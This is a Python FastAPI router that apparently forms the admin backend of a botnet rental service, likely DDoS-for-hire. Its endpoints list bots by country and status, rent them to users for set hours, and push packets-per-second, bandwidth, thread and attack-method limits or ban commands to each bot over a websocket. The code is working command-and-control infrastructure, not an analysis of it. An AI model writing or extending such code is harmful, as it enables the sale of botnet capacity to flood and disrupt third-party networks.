from fastapi import APIRouter, Depends, HTTPException, Query
from typing import Optional
from uuid import UUID
from app.auth import get_current_admin, get_current_user
from app.models.all_models import User
from app.schemas.all_schemas import BotOut, BotToggle, BotAssign, BotThrottle, PaginatedResponse
from app.services.bot_service import BotService
from app.websocket.bot_handler import manager

router = APIRouter(prefix="/api/bots", tags=["bots"])

@router.get("/", response_model=PaginatedResponse)
async def list_bots(
    status: Optional[str] = Query(None),
    is_rented: Optional[bool] = None,
    country: Optional[str] = None,
    search: Optional[str] = None,
    page: int = Query(1, ge=1),
    per_page: int = Query(50, ge=1, le=200),
    current_user: User = Depends(get_current_user),
):
    """Admin: all bots. User: only rented bots."""
    if current_user.role == "admin":
        items, total = await BotService.list_bots(status, is_rented, country, search, page, per_page)
    else:
        items, total = await BotService.list_user_bots(current_user.id, page, per_page)
    return PaginatedResponse(
        items=[BotOut.model_validate(b) for b in items],
        total=total, page=page, per_page=per_page,
        pages=(total + per_page - 1) // per_page if per_page else 0,
    )

@router.get("/mine", response_model=PaginatedResponse)
async def my_bots(
    page: int = Query(1, ge=1),
    per_page: int = Query(50, ge=1, le=200),
    current_user: User = Depends(get_current_user),
):
    items, total = await BotService.list_user_bots(current_user.id, page, per_page)
    return PaginatedResponse(
        items=[BotOut.model_validate(b) for b in items],
        total=total, page=page, per_page=per_page,
        pages=(total + per_page - 1) // per_page if per_page else 0,
    )

@router.get("/stats/online-count")
async def online_count(current_user: User = Depends(get_current_user)):
    return {"online": await BotService.count_online()}

@router.get("/{bot_id}", response_model=BotOut)
async def get_bot(bot_id: UUID, current_user: User = Depends(get_current_user)):
    bot = await BotService.get_bot(bot_id)
    if not bot:
        raise HTTPException(404, "Bot not found")
    if current_user.role != "admin" and bot.rented_by_user_id != current_user.id:
        raise HTTPException(403, "Not your bot")
    return BotOut.model_validate(bot)

@router.patch("/{bot_id}/toggle")
async def toggle_bot(bot_id: UUID, data: BotToggle, admin: User=Depends(get_current_admin)):
    bot = await BotService.get_bot(bot_id)
    if not bot: raise HTTPException(404, "Bot not found")
    if data.enabled:
        await BotService.set_status(bot_id, "online")
        await manager.send_json(str(bot_id), {
            "type": "config_update",
            "max_pps": bot.max_pps,
            "max_threads": bot.max_threads,
            "max_mbps": bot.max_mbps,
            "enabled_methods": bot.enabled_methods,
            "throttle": {
                "max_pps": bot.max_pps,
                "max_mbps": bot.max_mbps,
                "max_threads": bot.max_threads,
                "enabled_methods": bot.enabled_methods,
            },
        })
    else:
        await BotService.set_status(bot_id, "offline")
        await manager.send_json(str(bot_id), {"type": "standby"})
    await BotService.log_admin_action(admin.id, "bot.toggle", "bot", bot_id, {"enabled": data.enabled})
    return {"status":"ok"}

@router.patch("/{bot_id}/throttle")
async def set_throttle(bot_id: UUID, data: BotThrottle, admin: User=Depends(get_current_admin)):
    await BotService.update_throttle(bot_id, data.model_dump(exclude_none=True))
    bot = await BotService.get_bot(bot_id)
    await manager.send_json(str(bot_id), {
        "type": "config_update",
        "max_pps": bot.max_pps if bot else None,
        "max_threads": bot.max_threads if bot else None,
        "throttle": {
            "max_pps": bot.max_pps if bot else None,
            "max_mbps": bot.max_mbps if bot else None,
            "max_threads": bot.max_threads if bot else None,
            "enabled_methods": bot.enabled_methods if bot else None,
        },
    })
    await BotService.log_admin_action(admin.id, "bot.throttle", "bot", bot_id, data.model_dump(exclude_none=True))
    return {"status":"ok"}

@router.patch("/{bot_id}/assign")
async def assign_bot(bot_id: UUID, data: BotAssign, admin: User=Depends(get_current_admin)):
    await BotService.assign_bot(bot_id, UUID(data.user_id), data.duration_hours)
    await BotService.log_admin_action(admin.id, "bot.assign", "bot", bot_id, data.model_dump())
    return {"status":"ok"}

@router.post("/{bot_id}/unassign")
async def unassign_bot(bot_id: UUID, admin: User=Depends(get_current_admin)):
    await BotService.unassign_bot(bot_id); await BotService.log_admin_action(admin.id, "bot.unassign", "bot", bot_id)
    return {"status":"ok"}

@router.post("/{bot_id}/ban")
async def ban_bot(bot_id: UUID, admin: User=Depends(get_current_admin)):
    await BotService.set_status(bot_id, "banned"); await manager.send_json(str(bot_id), {"type":"ban"})
    await BotService.log_admin_action(admin.id, "bot.ban", "bot", bot_id)
    return {"status":"ok"}